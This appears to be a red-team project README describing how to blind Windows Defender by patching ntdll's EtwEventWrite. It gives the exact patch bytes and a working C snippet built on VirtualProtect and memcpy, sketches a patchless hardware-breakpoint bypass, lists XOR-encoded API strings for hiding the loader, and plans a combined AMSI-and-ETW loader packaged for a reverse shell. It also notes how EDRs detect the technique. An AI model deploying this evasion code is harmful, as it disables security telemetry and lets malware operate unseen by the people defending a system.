# PHASE 2 — ETW PATCHING (Complete The Dark Room)

## Classification: UNCLASSIFIED // ACADEMIC USE ONLY
## Status: CONFIRMED — Findings #34-#35 (classic detected, HWBP clean)

---

## Objective

Blind Defender's user-mode telemetry by patching `ntdll!EtwEventWrite`.
Combined with AMSI bypass (Phase 1), this creates a "dark room" where our
tools operate without Defender seeing script content OR process activity.

## How ETW Telemetry Flows

```
Your process code
    → ntdll!EtwEventWrite
        → ntdll!EtwEventWriteFull
            → ntdll!NtTraceEvent (syscall stub, eax = 0x5E)
                → KERNEL: nt!NtTraceEvent
                    → nt!EtwpEventWriteFull
                        → Defender/EDR consumers
```

Every ETW event from your process flows through `EtwEventWrite` in ntdll.dll.
Patch it → events never reach the syscall → Defender is blind to your process.

## The Patch

**Target:** `ntdll!EtwEventWrite` (covers all user-mode ETW providers in-process)

**x64 patch bytes (4 bytes):**
```
0x48, 0x31, 0xC0, 0xC3
```
Assembly: `xor rax, rax; ret` — returns STATUS_SUCCESS (0), callers see no error.

**Alternative (1 byte, minimal):**
```
0xC3
```
Assembly: `ret` — leaves rax dirty but functional. Less clean.

**API chain:**
```c
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
FARPROC pEtw   = GetProcAddress(hNtdll, "EtwEventWrite");
DWORD old;
VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);
memcpy(pEtw, "\x48\x31\xC0\xC3", 4);
VirtualProtect(pEtw, 4, old, &old);
```

**Standard user:** YES. VirtualProtect on your own process memory. No elevation.
Each process gets its own private ntdll.dll mapping. Patch is per-process only.

## What Goes Dark (User-Mode)

| Telemetry | Status After Patch |
|-----------|-------------------|
| .NET assembly load/unload events | BLIND |
| PowerShell ScriptBlock Logging | BLIND |
| JIT compilation traces | BLIND |
| Method load signatures | BLIND |
| AMSI scan trigger events | BLIND |
| In-process provider events | BLIND |

## What Survives (Kernel-Mode — EtwTi)

**Microsoft-Windows-Threat-Intelligence** runs at Ring 0. User-mode patching
CANNOT touch it. This is critical to understand:

| Kernel Function | What It Logs | Relevance |
|-----------------|-------------|-----------|
| EtwTiLogAllocExecVm | VirtualAlloc with RWX | Detects our shellcode allocation |
| EtwTiLogProtectExecVm | VirtualProtect to executable | **DETECTS THE ACT OF PATCHING ETW ITSELF** |
| EtwTiLogReadWriteVm | Cross-process memory R/W | Detects LSASS dumping |
| EtwTiLogSetContextThread | Thread context manipulation | Detects injection |
| EtwTiLogInsertQueueUserApc | APC injection | Detects APC-based injection |
| EtwTiLogSuspendResumeThread | Suspend/resume | Detects hollowing |

**The critical irony:** `EtwTiLogProtectExecVm` fires when we call
`VirtualProtect` to make ntdll writable. The act of blinding ETW generates
a kernel-level alert that we're blinding ETW.

From vader-toctou Finding #26: kernel-mode I/O bypasses user-mode hooks.
Same principle here — kernel ETW survives our user-mode patch.

## Patchless Alternative: Hardware Breakpoints

Set hardware debug register (DR0) on NtTraceEvent address. When hit,
exception handler redirects to no-op. No bytes modified → no VirtualProtect
call → no EtwTi alert.

```c
// Set DR0 = address of NtTraceEvent
// Set DR7 = enable DR0 breakpoint
// Install VEH handler that:
//   1. Checks if exception is at NtTraceEvent
//   2. If yes: set RIP to a ret stub, continue
//   3. If no: pass to next handler
```

This avoids triggering `EtwTiLogProtectExecVm` entirely.

## Implementation Plan

### Phase 2a — Basic Patch
1. Build C loader: patch EtwEventWrite in-process
2. Verify with ETW consumer tool (e.g., `logman query providers`)
3. Test: load .NET assembly → check if ScriptBlock Logging captures it

### Phase 2b — Patchless (Hardware Breakpoint)
1. Implement VEH + DR0 approach
2. Verify no EtwTi alert fires (compare with basic patch)
3. Test against Defender behavioral detection

### Phase 2c — Combined Dark Room
1. AMSI patch + ETW patch in single loader
2. Sequence: ETW first (blind telemetry), then AMSI (blind script scanning)
3. Package as DLL loadable by reverse shell

## XOR-Encoded Strings (key 0x41)

```
"ntdll.dll"       → { 0x2F, 0x35, 0x25, 0x2D, 0x2D, 0x6F, 0x25, 0x2D, 0x2D }
"EtwEventWrite"   → { 0x04, 0x35, 0x36, 0x04, 0x37, 0x24, 0x2F, 0x35,
                       0x16, 0x33, 0x28, 0x35, 0x24 }
"NtTraceEvent"    → { 0x0F, 0x35, 0x13, 0x33, 0x20, 0x22, 0x24, 0x04,
                       0x37, 0x24, 0x2F, 0x35 }
```

## Files (when built)

```
etw/
+-- etw_patch_annotated.c    # Basic patch with full commentary
+-- etw_patch.c              # Deployment variant
+-- etw_hwbp_annotated.c     # Hardware breakpoint patchless variant
+-- etw_verify.c             # Verify ETW is blinded
+-- README.md                # This file
```

## Key Limitation

User-mode ETW patching is a KNOWN technique. EDRs can detect it by:
1. Comparing in-memory ntdll .text against clean on-disk copy
2. Monitoring EtwTi alerts for VirtualProtect on ntdll pages
3. Checking if ETW providers are producing expected event volume

The hardware breakpoint variant is stealthier but adds complexity.
For our research environment (Defender only, no enterprise EDR), the
basic patch is sufficient to create the dark room we need for Phase 3.
